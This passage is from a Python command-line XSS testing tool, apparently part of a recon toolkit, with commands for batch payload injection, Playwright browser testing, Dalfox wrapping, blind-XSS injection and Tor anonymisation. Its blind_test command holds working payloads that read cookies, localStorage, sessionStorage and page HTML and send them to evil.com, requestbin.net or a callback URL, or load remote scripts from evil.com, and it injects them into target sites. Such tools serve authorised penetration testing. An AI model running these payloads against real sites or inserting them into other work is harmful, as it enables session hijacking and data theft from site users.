@click.option("--limit", default=20, help="Number of results to show")
@click.option("--vulnerable-only", is_flag=True, help="Show only vulnerable findings")
def show_results(limit, vulnerable_only):
    """Show recent XSS testing results."""
    results = []

    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Query vulnerabilities from main database
            query = session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS)

            if vulnerable_only:
                query = query.filter(Vulnerability.status != "false_positive")

            vulns = (
                query.order_by(Vulnerability.discovered_date.desc()).limit(limit).all()
            )

            for vuln in vulns:
                results.append(
                    {
                        "url": vuln.url,
                        "param": (
                            vuln.description.split("Parameter: ")[1].split(",")[0]
                            if "Parameter: " in (vuln.description or "")
                            else "N/A"
                        ),
                        "payload": vuln.payload or "N/A",
                        "vulnerable": True,
                        "reflected": True,  # Assume true for stored vulns
                        "tool": vuln.discovery_tool,
                        "severity": vuln.severity.value,
                        "timestamp": vuln.discovered_date.isoformat(),
                        "notes": vuln.description,
                    }
                )

            session.close()

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")
            # Fall through to fallback

    # Fallback or if main DB failed
    if not results:
        conn = sqlite3.connect(FALLBACK_DB_PATH)
        c = conn.cursor()

        query = "SELECT * FROM results WHERE 1=1"
        params = []

        if vulnerable_only:
            query += " AND vulnerable = 1"

        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)

        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        for r in rows:
            results.append(
                {
                    "url": r[1],
                    "param": r[2] or "N/A",
                    "payload": r[3][:100] if r[3] else "N/A",
                    "vulnerable": bool(r[5]),
                    "reflected": bool(r[4]),
                    "tool": r[10],
                    "severity": r[11],
                    "timestamp": r[9],
                    "notes": r[12],
                }
            )

    if results:
        print(f"[*] Showing {len(results)} recent results")
        print("=" * 100)
        for r in results:
            vuln = "[VULN]" if r["vulnerable"] else "[SAFE]"
            refl = "[REFLECTED]" if r["reflected"] else "[NOT REFLECTED]"
            print(f"URL: {r['url']}")
            print(f"Parameter: {r['param']}")
            print(f"Payload: {r['payload']}...")
            print(f"Status: {vuln} | {refl}")
            print(
                f"Tool: {r['tool']} | Severity: {r['severity']} | Time: {r['timestamp']}"
            )
            if r["notes"]:
                print(f"Notes: {r['notes']}")
            print("-" * 100)
    else:
        print("[*] No results found")


@cli.command()
def cleanup():
    """Clean up old results and optimize database."""
    if DB_AVAILABLE:
        try:
            print("[*] Main database cleanup is handled by dbcli")
            print(
                "[*] Use 'python -m reconcli.dbcli cleanup' for main database maintenance"
            )
        except Exception as e:
            print(f"[!] Error with main database: {e}")

    # Clean up fallback database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Remove old non-vulnerable results (older than 30 days)
    thirty_days_ago = (datetime.now() - timedelta(days=30)).isoformat()
    c.execute(
        "DELETE FROM results WHERE vulnerable = 0 AND timestamp < ?", (thirty_days_ago,)
    )
    deleted = c.rowcount

    conn.commit()
    conn.close()

    # Vacuum database (requires separate connection)
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    conn.execute("VACUUM")
    conn.close()

    print(f"[*] Cleaned up {deleted} old results from local database and optimized")


# Additional utility commands
@cli.command()
@click.option("--input", required=True, help="File with URLs")
@click.option("--pattern", required=True, help="Grep pattern to search")
def gf(input, pattern):
    """Run gf (grep) on input file."""
    if not check_binary("gf"):
        print("[!] gf not found in PATH")
        return

    try:
        with open(input) as f:
            urls = [line.strip() for line in f if line.strip()]

        print(f"[*] Running gf on {len(urls)} URLs")
        for url in urls:
            # Use subprocess.run without shell=True for security
            try:
                result = subprocess.run(
                    ["gf", pattern],
                    input=url,
                    text=True,
                    capture_output=True,
                    timeout=10,
                )
                if result.stdout.strip():
                    print(result.stdout.strip())
            except subprocess.TimeoutExpired:
                print(f"[!] Timeout processing URL: {url[:50]}...")
            except Exception as e:
                print(f"[!] Error processing URL {url[:50]}...: {e}")

    except Exception as e:
        print(f"[!] Error running gf: {e}")


@cli.command()
@click.option("--target", required=True, help="Target URL or domain")
@click.option("--payloads", help="Custom payloads file")
@click.option("--threads", default=50, help="Number of threads")
@click.option("--output", help="Output file")
def dalfox(target, payloads, threads, output):
    """Run Dalfox XSS scanner."""
    if not check_binary("dalfox"):
        print("[!] dalfox not found in PATH")
        return

    cmd = ["dalfox", "url", target, "--worker", str(threads)]

    if payloads:
        cmd.extend(["--custom-payload", payloads])

    if output:
        cmd.extend(["-o", output])

    print(f"[*] Running Dalfox on {target}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Dalfox scan completed successfully")
            save_result(
                target,
                tool_used="dalfox",
                vulnerable=True if "VULN" in result.stdout else False,
            )
        else:
            print(f"[!] Dalfox error: {result.stderr}")
    except Exception as e:
        print(f"[!] Dalfox error: {e}")


@cli.command()
@click.option("--url", required=True, help="URL to test with Playwright")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--screenshot", is_flag=True, help="Take screenshots on XSS trigger")
@click.option("--timeout", default=30, help="Timeout in seconds")
def playwright_test(url, payloads_file, screenshot, timeout):
    """Advanced XSS testing using Playwright browser automation."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[!] Playwright Python module not found")
        print("[*] Install with: pip install playwright && playwright install")
        return

    if not check_binary("playwright"):
        print("[!] Playwright binary not found in PATH")
        print("[*] Install with: pip install playwright && playwright install")
        return

    payloads = []

    # Load payloads
    if payloads_file and os.path.exists(payloads_file):
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default advanced payloads for DOM testing
        payloads = [
            "<svg onload=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'><svg onload=alert('XSS')>",
            "\"><img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]

    print(f"[*] Starting Playwright XSS testing on {url}")
    print(f"[*] Testing {len(payloads)} payloads with timeout {timeout}s")

    # Create Playwright script
    playwright_script = f"""
from playwright.sync_api import sync_playwright
import sys
import time

def test_xss():
    payloads = {payloads}
    url = "{url}"
    timeout = {timeout * 1000}  # Convert to milliseconds
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # Set up alert handler
        alerts_triggered = []
        page.on("dialog", lambda dialog: (
            alerts_triggered.append(dialog.message),
            dialog.accept()
        ))
        
        vulnerable_payloads = []
        
        for i, payload in enumerate(payloads, 1):
            print(f"[*] Testing payload {{i}}/{{len(payloads)}}: {{payload[:50]}}...")
            
            try:
                # Test in URL parameter
                test_url = f"{{url}}?test={{payload}}"
                page.goto(test_url, timeout=timeout)
                page.wait_for_timeout(2000)  # Wait 2 seconds
                
                # Check if alert was triggered
                if alerts_triggered:
                    print(f"[+] XSS TRIGGERED: {{payload}}")
                    vulnerable_payloads.append(payload)
                    alerts_triggered.clear()
                    
                    # Take screenshot if enabled
                    if {screenshot}:
                        page.screenshot(path=f'xss_screenshot_{{i}}.png')
                
                # Test in search forms if present
                search_inputs = page.query_selector_all("input[type='text'], input[type='search'], textarea")
                for input_elem in search_inputs:
                    try:
                        input_elem.fill(payload)
                        input_elem.press("Enter")
                        page.wait_for_timeout(1000)
                        
                        if alerts_triggered:
                            print(f"[+] XSS TRIGGERED IN FORM: {{payload}}")
                            vulnerable_payloads.append(f"FORM: {{payload}}")
                            alerts_triggered.clear()
                            break
                    except:
                        continue
                        
            except Exception as e:
                print(f"[!] Error testing payload: {{e}}")
                continue
        
        browser.close()
        
        print(f"\\n[*] Playwright testing completed.")
        print(f"[*] Found {{len(vulnerable_payloads)}} working payloads:")
        for payload in vulnerable_payloads:
            print(f"  - {{payload}}")
        
        return vulnerable_payloads

if __name__ == "__main__":
    test_xss()
"""

    # Write and execute Playwright script
    import tempfile

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp_file:
        tmp_file.write(playwright_script)
        script_path = tmp_file.name

    try:
        result = subprocess.run(
            [sys.executable, script_path],
            capture_output=True,
            text=True,
            timeout=timeout + 30,
        )

        if result.returncode == 0:
            print(result.stdout)
            # Parse results and save to database
            if "XSS TRIGGERED" in result.stdout:
                save_result(
                    url,
                    tool_used="playwright",
                    vulnerable=True,
                    notes="XSS detected via Playwright automation",
                )
        else:
            print(f"[!] Playwright script error: {result.stderr}")

    except subprocess.TimeoutExpired:
        print("[!] Playwright test timed out")
    except Exception as e:
        print(f"[!] Error running Playwright test: {e}")
    finally:
        # Clean up
        if os.path.exists(script_path):
            os.remove(script_path)


@cli.command()
@click.option("--input", required=True, help="File with URLs to test")
@click.option("--output", help="Output file for vulnerable URLs")
@click.option("--threads", default=10, help="Number of concurrent threads")
@click.option("--delay", default=1, type=float, help="Delay between requests")
def batch_test(input, output, threads, delay):
    """Batch XSS testing on multiple URLs."""
    if not os.path.exists(input):
        print(f"[!] Input file not found: {input}")
        return

    with open(input) as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"[*] Starting batch XSS testing on {len(urls)} URLs")
    print(f"[*] Using {threads} threads with {delay}s delay")

    vulnerable_urls = []

    # Simple threaded testing (basic implementation)
    # In production, you'd want to use proper threading/async

    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><img src=x onerror=alert('XSS')>",
    ]

    for i, url in enumerate(urls, 1):
        print(f"[*] Testing {i}/{len(urls)}: {url}")

        try:
            with httpx.Client(timeout=10) as client:
                for payload in test_payloads:
                    test_url = f"{url}?test={urllib.parse.quote(payload)}"

                    try:
                        response = client.get(test_url)
                        if payload in response.text:
                            print(f"[+] VULNERABLE: {url}")
                            vulnerable_urls.append(url)
                            save_result(
                                url,
                                payload=payload,
                                reflected=True,
                                vulnerable=True,
                                tool_used="batch_test",
                            )
                            break
                    except (httpx.RequestError, httpx.HTTPStatusError) as e:
                        print(f"[!] Request error for {url}: {e}")
                        continue
                    except Exception as e:
                        print(f"[!] Unexpected error for {url}: {e}")
                        continue

        except Exception as e:
            print(f"[!] Error testing {url}: {e}")

        time.sleep(delay)

    print(f"\n[*] Batch testing completed")
    print(f"[*] Found {len(vulnerable_urls)} potentially vulnerable URLs")

    if output and vulnerable_urls:
        with open(output, "w") as f:
            f.write("\n".join(vulnerable_urls))
        print(f"[*] Vulnerable URLs saved to {output}")


@cli.command()
@click.option("--query", required=True, help="Search query for custom payloads")
def search_payloads(query):
    """Search custom payloads by description or tags."""
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Search in payload, description, and tags
    search_term = f"%{query}%"
    c.execute(
        """
        SELECT * FROM custom_payloads 
        WHERE payload LIKE ? OR description LIKE ? OR tags LIKE ?
        ORDER BY success_rate DESC
    """,
        (search_term, search_term, search_term),
    )

    payloads = c.fetchall()
    conn.close()

    if payloads:
        print(f"[*] Found {len(payloads)} payloads matching '{query}':")
        for p in payloads:
            print(f"ID: {p[0]} | Category: {p[2]}")
            print(f"Payload: {p[1]}")
            if p[3]:  # description
                print(f"Description: {p[3]}")
            if p[8]:  # tags
                print(f"Tags: {p[8]}")
            print(f"Success Rate: {p[5]:.2f} | Used: {p[6]} times")
            print("-" * 60)
    else:
        print(f"[*] No payloads found matching '{query}'")


@cli.command()
@click.option("--url", required=True, help="Base URL to generate XSS test cases")
@click.option("--params", help="Comma-separated list of parameters to test")
@click.option("--output", help="Output file for test cases")
def generate_tests(url, params, output):
    """Generate XSS test cases for a specific URL and parameters."""
    if params:
        param_list = [p.strip() for p in params.split(",")]
    else:
        # Default common parameters
        param_list = ["q", "search", "query", "input", "data", "text", "value", "name"]

    # Basic payload categories
    payload_categories = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ],
        "event_handlers": [
            "<input onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ],
        "javascript_urls": [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
        ],
        "encoded": [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
        ],
    }

    test_cases = []

    for param in param_list:
        for category, payloads in payload_categories.items():
            for payload in payloads:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                test_cases.append(
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "category": category,
                        "method": "GET",
                    }
                )

                # Also generate POST test case
                test_cases.append(
                    {
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "category": category,
                        "method": "POST",
                    }
                )

    print(f"[*] Generated {len(test_cases)} XSS test cases")
    print(f"[*] Testing {len(param_list)} parameters: {', '.join(param_list)}")

    if output:
        # Export test cases
        if output.endswith(".json"):
            with open(output, "w") as f:
                json.dump(test_cases, f, indent=2)
        elif output.endswith(".csv"):
            with open(output, "w", newline="") as f:
                writer = csv.DictWriter(
                    f, fieldnames=["url", "parameter", "payload", "category", "method"]
                )
                writer.writeheader()
                writer.writerows(test_cases)
        else:  # txt format
            with open(output, "w") as f:
                for tc in test_cases:
                    if tc["method"] == "GET":
                        f.write(f"{tc['url']}\\n")
                    else:
                        f.write(
                            f"POST {tc['url']} - {tc['parameter']}={tc['payload']}\\n"
                        )

        print(f"[*] Test cases saved to {output}")
    else:
        # Print first 10 examples
        print("\\n[*] Sample test cases (first 10):")
        for tc in test_cases[:10]:
            if tc["method"] == "GET":
                print(f"  {tc['url']}")
            else:
                print(f"  POST {tc['url']} - {tc['parameter']}={tc['payload']}")
        if len(test_cases) > 10:
            print(f"  ... and {len(test_cases) - 10} more")


@cli.command()
@click.option("--url", required=True, help="URL to test for blind XSS")
@click.option("--param", help="Parameter to inject blind XSS payload")
@click.option(
    "--callback-url",
    help="Your callback URL (e.g., from XSS Hunter, Burp Collaborator)",
)
@click.option("--email", help="Your email for blind XSS notifications")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=2, type=float, help="Delay between requests")
@click.option("--custom-payload", help="Custom blind XSS payload")
def blind_test(url, param, callback_url, email, method, delay, custom_payload):
    """Test for Blind XSS vulnerabilities with callback payloads."""

    # Default blind XSS payloads
    blind_payloads = []

    if custom_payload:
        blind_payloads.append(custom_payload)
    else:
        # XSS Hunter style payloads
        if callback_url:
            blind_payloads.extend(
                [
                    f"<script src='{callback_url}'></script>",
                    f"<img src='x' onerror='var s=document.createElement(\"script\");s.src=\"{callback_url}\";document.head.appendChild(s)'>",
                    f"<svg onload='fetch(\"{callback_url}?cookie=\"+document.cookie)'>",
                    f'<iframe src=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'></iframe>',
                    f'<script>setTimeout(function(){{var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)}}, 1000)</script>',
                    f'<object data=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'></object>',
                    f'<embed src=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'>',
                    f'<video><source onerror=\'var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'>',
                    f"<audio src='x' onerror='var s=document.createElement(\"script\");s.src=\"{callback_url}\";document.head.appendChild(s)'>",
                ]
            )

        # Email-based blind XSS (for internal applications)
        if email:
            blind_payloads.extend(
                [
                    f"<script>var img=new Image();img.src='http://requestbin.net/r/xxx?email={email}&url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie)</script>",
                    f"<img src='x' onerror='fetch(\"http://requestbin.net/r/xxx?email={email}&data=\"+btoa(document.documentElement.innerHTML))'>",
                    f'<svg onload=\'setTimeout(function(){{var xhr=new XMLHttpRequest();xhr.open("POST","http://requestbin.net/r/xxx");xhr.send("email={email}&page="+location.href+"&dom="+document.documentElement.innerHTML)}}, 2000)\'>',
                ]
            )

        # Generic blind XSS payloads (no callback needed)
        generic_blind = [
            "<script>setTimeout(function(){var s=document.createElement('script');s.src='//evil.com/blindxss.js';document.head.appendChild(s)}, 3000)</script>",
            "<img src='x' onerror='setTimeout(function(){location.href=\"//evil.com/blind?data=\"+btoa(document.cookie)}, 2000)'>",
            '<svg onload=\'setTimeout(function(){var i=new Image();i.src="//evil.com/log?url="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie)}, 1000)\'>',
            "<iframe src='javascript:setTimeout(function(){document.location=\"//evil.com/exfil?data=\"+btoa(document.documentElement.innerHTML)}, 5000)'></iframe>",
            "<script>document.addEventListener('DOMContentLoaded', function(){var s=document.createElement('script');s.src='//evil.com/payload.js';document.head.appendChild(s)})</script>",
            '<object data=\'javascript:setTimeout(function(){fetch("//evil.com/collect",{method:"POST",body:JSON.stringify({url:location.href,cookies:document.cookie,storage:localStorage})})}, 3000)\'></object>',
            "'\"><script>if(window.parent!=window){var s=document.createElement('script');s.src='//evil.com/frame.js';window.parent.document.head.appendChild(s)}</script>",
            "<script>function blindXSS(){var data={url:location.href,referrer:document.referrer,cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage)};fetch('//evil.com/collect',{method:'POST',body:JSON.stringify(data)})}; setTimeout(blindXSS, 5000)</script>",
        ]

        blind_payloads.extend(generic_blind)

    if not blind_payloads:
        print(
            "[!] No blind XSS payloads configured. Please provide --callback-url, --email, or --custom-payload"
        )
        return

    print(f"[*] Testing {len(blind_payloads)} blind XSS payloads on {url}")
    print(f"[*] Callback URL: {callback_url or 'None'}")
    print(f"[*] Email notification: {email or 'None'}")
    print(
        "[*] Note: Blind XSS results may take time to appear - check your callback service"
    )

    injected_payloads = []

    try:
        with httpx.Client(timeout=15) as client:
            for i, payload in enumerate(blind_payloads, 1):
                print(
                    f"[*] Injecting blind payload {i}/{len(blind_payloads)}: {payload[:80]}..."
                )

                try:
                    if method.upper() == "GET":
                        if param:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        else:
                            test_url = f"{url}?xss_test={urllib.parse.quote(payload)}"

                        response = client.get(test_url)

                    elif method.upper() == "POST":
                        data = {}
                        if param:
                            data[param] = payload
                        else:
                            data["xss_test"] = payload

                        response = client.post(url, data=data)
                        test_url = url

                    if response.status_code < 500:  # Server didn't crash
                        print(f"[+] PAYLOAD INJECTED: HTTP {response.status_code}")
                        injected_payloads.append(payload)

                        # Save to database
                        save_result(
                            test_url if method.upper() == "GET" else url,
                            param,
                            payload,
                            reflected=False,  # Blind XSS is not reflected immediately
                            vulnerable=True,  # Assume vulnerable if injected successfully
                            method=method,
                            response_code=response.status_code,
                            tool_used="blind_test",
                            severity="medium",  # Blind XSS is usually medium risk
                            notes=f"Blind XSS payload injected. Callback: {callback_url or 'Generic'}",
                        )
                    else:
                        print(f"[!] Server error: HTTP {response.status_code}")

                except Exception as e:
                    print(f"[!] Error injecting payload: {e}")

                time.sleep(delay)

    except Exception as e:
        print(f"[!] Error during blind XSS testing: {e}")

    print(f"\n[*] Blind XSS testing completed.")
    print(f"[*] Successfully injected {len(injected_payloads)} payloads")
    print("[*] Check your callback service for blind XSS triggers")

    if callback_url:
        print(f"[*] Monitor: {callback_url}")
    if email:
        print(f"[*] Check email: {email}")

    # Show tips
    print("\n[!] BLIND XSS TESTING TIPS:")
    print("   - Use XSS Hunter (xsshunter.com) for advanced blind XSS detection")
    print("   - Try Burp Collaborator for callback URLs")
    print("   - Check your callback service after 5-10 minutes")
    print("   - Some blind XSS may trigger hours or days later")
    print(
        "   - Test in different user contexts (admin panels, email notifications, etc.)"
    )


@cli.command()
@click.option("--url", help="Add callback URL")
@click.option("--list", "list_urls", is_flag=True, help="List stored callback URLs")
@click.option("--remove", help="Remove callback URL by ID")
@click.option("--test", help="Test callback URL connectivity")
def blind_callback(url, list_urls, remove, test):
    """Manage blind XSS callback URLs."""

    # Use fallback database for callback URLs storage
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Create callback URLs table if not exists
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS blind_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            description TEXT,
            active INTEGER DEFAULT 1,
            added_date TEXT,
            last_used TEXT,
            times_used INTEGER DEFAULT 0
        )
    """
    )

    if url:
        # Add new callback URL
        timestamp = datetime.now().isoformat()
        c.execute(
            """
            INSERT INTO blind_callbacks (url, added_date)
            VALUES (?, ?)
        """,
            (url, timestamp),
        )
        conn.commit()
        print(f"[+] Added callback URL: {url}")

    elif list_urls:
        # List all callback URLs
        c.execute("SELECT * FROM blind_callbacks ORDER BY added_date DESC")
        callbacks = c.fetchall()

        if callbacks:
            print("[*] Stored blind XSS callback URLs:")
            print("-" * 80)
            for cb in callbacks:
                status = "Active" if cb[3] else "Inactive"
                print(f"ID: {cb[0]} | {status}")
                print(f"URL: {cb[1]}")
                if cb[2]:  # description
                    print(f"Description: {cb[2]}")
                print(f"Added: {cb[4]} | Used: {cb[6]} times")
                if cb[5]:  # last_used
                    print(f"Last used: {cb[5]}")
                print("-" * 80)
        else:
            print("[*] No callback URLs stored")

    elif remove:
        # Remove callback URL
        c.execute("DELETE FROM blind_callbacks WHERE id = ?", (remove,))
        if c.rowcount > 0:
            conn.commit()
            print(f"[+] Removed callback URL ID: {remove}")
        else:
            print(f"[!] No callback URL found with ID: {remove}")

    elif test:
        # Test callback URL connectivity
        print(f"[*] Testing callback URL: {test}")
        try:
            with httpx.Client(timeout=10) as client:
                test_data = {
                    "test": "blind_xss_connectivity_check",
                    "timestamp": datetime.now().isoformat(),
                    "source": "xsscli_blind_test",
                }

                # Try GET request
                response = client.get(f"{test}?test=connectivity_check")
                print(f"[+] GET test: HTTP {response.status_code}")

                # Try POST request
                response = client.post(test, json=test_data)
                print(f"[+] POST test: HTTP {response.status_code}")

                print("[+] Callback URL appears to be reachable")

        except Exception as e:
            print(f"[!] Error testing callback URL: {e}")

    else:
        # Show usage
        print("[*] Blind XSS Callback Management")
        print("Usage examples:")
        print("  --url https://your-callback.com/xss    # Add callback URL")
        print("  --list                                  # List all callbacks")
        print("  --remove 1                              # Remove callback by ID")
        print("  --test https://callback.com/test        # Test connectivity")
        print("\n[*] Popular blind XSS services:")
        print("  - XSS Hunter: https://xsshunter.com")
        print("  - Burp Collaborator: Built into Burp Suite")
        print("  - Canarytokens: https://canarytokens.org")
        print("  - RequestBin: https://requestbin.net")
        print("  - Webhook.site: https://webhook.site")

    conn.close()


@cli.command()
@click.option(
    "--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL to test"
)
def tor_check(tor_proxy):
    """Check Tor proxy connectivity and anonymity."""
    print(f"[*] Testing Tor proxy: {tor_proxy}")

    # Test without Tor first
    try:
        print(f"[*] Getting current IP without Tor...")
        with httpx.Client(timeout=10) as client:
            response = client.get("https://httpbin.org/ip")
            if response.status_code == 200:
                real_ip = response.json().get("origin", "unknown")
                print(f"[*] Real IP: {real_ip}")
            else:
                print(f"[!] Could not get real IP")
                real_ip = None
    except Exception as e:
        print(f"[!] Error getting real IP: {e}")
        real_ip = None

    # Test with Tor
    try:
        print(f"[*] Testing connection through Tor...")
        tor_client = setup_tor_proxy(tor_proxy)

        if tor_client:
            with tor_client:
                # Test IP change
                response = tor_client.get("https://httpbin.org/ip", timeout=15)
                if response.status_code == 200:
                    tor_ip = response.json().get("origin", "unknown")
                    print(f"[+] Tor IP: {tor_ip}")

                    if real_ip and tor_ip != real_ip:
                        print(f"[+] ✅ IP successfully changed through Tor!")
                    else:
                        print(f"[!] ⚠️  Warning: IP may not have changed")

                # Test Tor verification
                try:
                    response = tor_client.get(
                        "https://check.torproject.org/api/ip", timeout=15
                    )
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("IsTor", False):
                            print(f"[+] ✅ Tor connection verified by torproject.org")
                            print(f"[+] Exit node IP: {data.get('IP', 'unknown')}")
                        else:
                            print(f"[!] ❌ Not using Tor according to torproject.org")
                    else:
                        print(f"[!] Could not verify with torproject.org")
                except Exception as e:
                    print(f"[!] Tor verification failed: {e}")

                # Test DNS leak
                try:
                    response = tor_client.get(
                        "https://1.1.1.1/cdn-cgi/trace", timeout=10
                    )
                    if response.status_code == 200:
                        trace_data = response.text
                        if "ip=" in trace_data:
                            dns_ip = trace_data.split("ip=")[1].split("\n")[0]
                            print(f"[*] DNS resolver sees IP: {dns_ip}")
                except Exception as e:
                    print(f"[!] DNS leak test failed: {e}")
        else:
            print(f"[!] ❌ Failed to establish Tor connection")

    except Exception as e:
        print(f"[!] Error testing Tor: {e}")

    print(f"\n[*] Tor connectivity test completed")


@cli.command()
def tor_setup():
    """Show Tor setup instructions."""
    print(
        """
[*] Tor Setup Guide for XSS CLI
================================

1. Install Tor:
   Ubuntu/Debian: sudo apt install tor
   CentOS/RHEL: sudo yum install tor
   macOS: brew install tor
   Windows: Download from https://www.torproject.org/

2. Start Tor service:
   Linux: sudo systemctl start tor
   macOS: brew services start tor
   Windows: Run Tor Browser or Tor Expert Bundle

3. Verify Tor is running:
   - Default SOCKS proxy: 127.0.0.1:9050
   - Check with: netstat -tlnp | grep 9050

4. Test with xsscli:
   reconcli xsscli tor-check
   reconcli xsscli test-input --input urls.txt --tor
   reconcli xsscli manual-test --url https://example.com --tor

5. Security Tips:
   - Use --delay to avoid rate limiting
   - Rotate circuits: sudo systemctl reload tor
   - Monitor logs: tail -f /var/log/tor/log
   - Never use Tor for illegal activities

6. Tor Configuration (/etc/tor/torrc):
   # Increase circuit build timeout
   CircuitBuildTimeout 30
   
   # Use specific exit nodes (optional)
   ExitNodes {us},{ca},{gb}
   
   # Avoid certain countries
   ExcludeExitNodes {cn},{ru},{ir}

7. Advanced Options:
   --tor-proxy socks5://127.0.0.1:9050    # Default
   --tor-proxy socks5://proxy.tor.net:9050 # Custom proxy
   
[!] LEGAL DISCLAIMER:
   - Use Tor responsibly and legally
   - Respect website terms of service
   - Obtain proper authorization before testing
   - Some countries restrict Tor usage
"""
    )


if __name__ == "__main__":
    cli()
